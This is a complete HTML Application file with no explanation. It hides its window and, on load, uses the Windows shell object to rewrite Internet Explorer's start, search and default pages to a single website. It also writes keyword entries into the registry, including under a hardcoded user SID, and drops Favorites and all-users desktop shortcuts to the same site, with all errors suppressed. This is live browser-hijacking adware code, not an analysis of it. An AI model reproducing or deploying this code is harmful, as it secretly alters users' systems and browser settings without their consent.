   <html>
   <hta:application caption="no" showintaskbar="no">
   <body onload="window.blur();">
   <object id='bugs' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
   <script LANGUAGE="VBScript.Encode">
   on error resume next
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.262.com/"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.262.com/"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "http://www.262.com/"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\default_page_url", "http://www.262.com/"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page", "http://www.262.com/"
   bugs.RegWrite "HKCU\Software\3721\InputCns\2", unescape("%u7F8E%u5973%u660E%u661F%u56FE%u7247")
   bugs.RegWrite "HKU\S-1-5-21-725345543-308236825-2146997909-1003\Software\3721\InputCns\2", unescape("%u7F8E%u5973%u660E%u661F%u56FE%u7247")
   bugs.RegWrite "HKCU\Software\3721\InputCns\50", unescape("%u5728%u7EBF%u7535%u5F71%u53F0")
   bugs.RegWrite "HKU\S-1-5-21-725345543-308236825-2146997909-1003\Software\3721\InputCns\50", unescape("%u5728%u7EBF%u7535%u5F71%u53F0")
   bugs.RegWrite "HKCU\Software\3721\InputCns\99", unescape("262%u4E0A%u7F51%u5BFC%u822A")
   bugs.RegWrite "HKU\S-1-5-21-725345543-308236825-2146997909-1003\Software\3721\InputCns\99", unescape("262%u4E0A%u7F51%u5BFC%u822A")
   window.close
   </script>
   <script language="VBScript.Encode">
   on error resume next
   Call Bugs_AddFavorites(unescape("262%u7F51%u5740%20%u4E0A%u7F51%u5BFC%u822A"),"http://www.262.com")

   on error resume next
   Call Bugs_AddDesktop(unescape("%u4E0A%u7F51%u5BFC%u822A"),"http://www.262.com")

   Function Bugs_AddFavorites(N, U)
       on error resume next
       Set S = bugs.CreateShortcut(bugs.SpecialFolders("Favorites") + "/" + N +".URL")
       S.TargetPath = U
       S.Save()
   End Function

   Function Bugs_AddDesktop(N, U)
       on error resume next
       Set S = bugs.CreateShortcut(bugs.SpecialFolders("AllUsersDesktop") + "/" + N +".URL")
       S.TargetPath = U
       S.Save()
   End Function
   </script>
   <script language="JScript.Encode">
   window.close();
   </script>
   </body>
   </html>
